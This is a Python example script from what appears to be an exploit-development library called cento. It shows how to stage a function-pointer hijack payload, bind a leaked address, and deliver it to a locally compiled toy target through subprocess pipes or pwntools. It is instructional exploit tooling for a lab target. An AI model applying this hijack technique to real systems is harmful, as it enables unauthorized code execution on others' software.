# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
"""cento -- borrowed fragments, arranged deliberately, checked as a whole.

Example 11 -- the thrower: your tube, cento's plan

The audience's first question: "how does this plug into my pwntools workflow?" Answer: a thrower
is ANY code that writes (addr, bytes) pairs and calls confirm() -- cento never owns the transport
(ex06's thrower was simulated; this one is real). This example builds a payload whose function
pointer is a symbolic win address, stages it through a DeliveryPlan, and throws it at a live
compiled target (devmon.c, next to this script: a debug monitor left in production, poking bytes
at fictional device addresses) through whichever tube is on hand. The two throwers below are ~15
lines each, side by side, and consume the SAME plan: a stdlib subprocess pipe always, a pwntools
pwn.process tube if pwntools is importable (it is optional, never a dependency). Each starts the
monitor, reads the win leak off the banner, binds it, delivers plan.stage() then plan.finalize()
groups as "W <hexaddr> <hexbytes>" commands -- confirm()ing on each "ok" reply, so delivered-ness
comes from the tube's own acks -- and only then sends "X", because finalize() yields the ARM
trigger group LAST.

Run: python3 examples/ex11/ex11_the_thrower.py   (cc required; explains itself and exits cleanly without one)
Next: ex01_find_your_offset (start over)
"""

from __future__ import annotations

import importlib
import json
import pathlib
import shutil
import subprocess
import sys

import cento

HERE = pathlib.Path(__file__).parent
DEVMON_C = HERE / "devmon.c"
DEVMON = HERE / "devmon"  # built at runtime, gitignored -- the ex01/ctf/vuln precedent
LOCAL = cento.target({"schema": 1, "name": "devmon-x86", "endian": "little"})

DEV_BASE = 0x20000000  # the fictional device VA of the scratch page: devmon subtracts it from every W address
DOORBELL = 0x1337  # the argument the hijacked call carries: win() prints it back
FPTR_OFF = 0x100  # devmon's fixed slots: function pointer at +0x100, argument right after


class Unlock(cento.View, size=0x8):
    """The debug-unlock magic at scratch+0: devmon's X command refuses to jump without it."""

    magic = cento.Field(0x0, cento.Bytes(8), default=b"cento-11")


class Hijack(cento.View, size=0x10):
    """The record devmon's X command consumes at scratch+0x100: call fptr((unsigned)arg)."""

    fptr: cento.u64
    arg: cento.u64


def build_plan() -> cento.DeliveryPlan:
    """The campaign, transport-free: what lands where, in what order -- with the trigger gated ARM."""
    layout = LOCAL.layout("devmon-hijack")
    page = layout.region("scratch", base="scratch_va", max_size=0x400)
    page.at(0x0, Unlock, name="unlock")  # placing the view writes the magic: a NORMAL cell
    rec = page.at(FPTR_OFF, Hijack, name="rec")
    rec.fptr = layout.sym("win_addr")  # symbolic until a live leak binds it
    rec.arg = DOORBELL
    layout.mark(rec.fptr, cento.Deliver.ARM)  # the trigger word ships last, from finalize() only
    layout.expect_sym("win_addr", range=(0x1000, (1 << 64) - 1))  # a mis-parsed leak refuses at bind, not on the wire
    plan = layout.plan()
    plan.bind("scratch_va", DEV_BASE, source="devmon protocol: the fixed device base it subtracts")
    return plan


def throw_stdlib(plan: cento.DeliveryPlan) -> str:
    """A thrower in stdlib only: subprocess pipes are a perfectly good tube."""
    with subprocess.Popen([str(DEVMON)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, encoding="ascii") as proc:
        assert proc.stdin is not None and proc.stdout is not None  # both are PIPE above
        leak = proc.stdout.readline().strip()
        print(f"  leak: {leak!r}")
        plan.bind("win_addr", int(leak.split("@")[1], 16), source="leak: devmon banner")
        for phase in (plan.stage, plan.finalize):  # finalize() yields the ARM trigger group LAST
            for group in phase():
                for addr, data in group.items:
                    proc.stdin.write(f"W {addr:x} {data.hex()}\n")
                    proc.stdin.flush()
                    if not proc.stdout.readline().startswith("ok W"):
                        raise RuntimeError(f"devmon refused a write at {addr:#x}")
                plan.confirm(group)  # delivered-ness comes from the tube's ack, not from hope
        proc.stdin.write("X\n")  # the trigger command: sent only after finalize() shipped the ARM group
        proc.stdin.flush()
        result: str = proc.stdout.readline().strip()  # annotated: typeshed (mypy >= 2.3) types Popen[str].stdout as IO[Any]
        return result


def throw_pwntools(plan: cento.DeliveryPlan) -> str:
    """The SAME campaign through a pwntools tube: only the transport lines changed."""
    pwn = importlib.import_module("pwn")  # inside the function: pwntools is optional, never a cento dependency
    io = pwn.process(str(DEVMON))
    leak: str = io.recvline().decode("ascii").strip()
    print(f"  leak: {leak!r}")
    plan.bind("win_addr", int(leak.split("@")[1], 16), source="leak: devmon banner")
    for phase in (plan.stage, plan.finalize):  # the same two calls, the same ARM-last guarantee
        for group in phase():
            for addr, data in group.items:
                io.sendline(f"W {addr:x} {data.hex()}".encode("ascii"))
                if not io.recvline().startswith(b"ok W"):
                    raise RuntimeError(f"devmon refused a write at {addr:#x}")
            plan.confirm(group)
    io.sendline(b"X")
    win: str = io.recvline().decode("ascii").strip()
    io.close()
    return win


def main(argv: list[str] | None = None) -> bool:
    # argv is the in-process test contract (tests pass []); this example takes no flags.
    compiler = shutil.which("cc") or shutil.which("gcc") or shutil.which("clang")
    if compiler is None:
        print("no C compiler found (cc/gcc/clang) -- this example compiles its own target; install one and rerun")
        return True
    subprocess.run([compiler, "-O0", "-Wall", "-o", str(DEVMON), str(DEVMON_C)], check=True, capture_output=True)
    print(f"compiled {DEVMON.name} (-O0 -Wall); protocol: 'W <hexaddr> <hexbytes>' pokes the scratch page, 'X' calls the slot")

    print("\nthrow 1: the stdlib tube (subprocess pipes)")
    plan = build_plan()
    print(f"  {throw_stdlib(plan)}")
    ran = ["stdlib"]

    try:
        importlib.import_module("pwn")
    except Exception:  # noqa: BLE001 -- pwntools initializes a terminal at import: ImportError when absent, curses/fileno errors under captured stdout
        print("\nthrow 2 skipped: pwntools not importable here (optional -- pip install pwntools and a real terminal to see the same plan ride pwn.process)")
    else:
        print("\nthrow 2: the pwntools tube (pwn.process), consuming a fresh plan of the SAME campaign")
        print(f"  {throw_pwntools(build_plan())}")
        ran.append("pwntools")

    print(f"\nthrowers ran: {', '.join(ran)}")
    print("ledger: the stdlib throw's campaign, append-only; plan.ledger.save(path) writes the JSONL a CI job archives")
    for event in plan.ledger.events:
        if event["ev"] in ("bind", "arm_intent", "finalize"):
            row = {k: v for k, v in event.items() if k != "ts"}  # ts dropped for a stable print
            print(f"  {json.dumps(row, sort_keys=True)}")
    return True


if __name__ == "__main__":
    if not main():
        sys.exit(1)
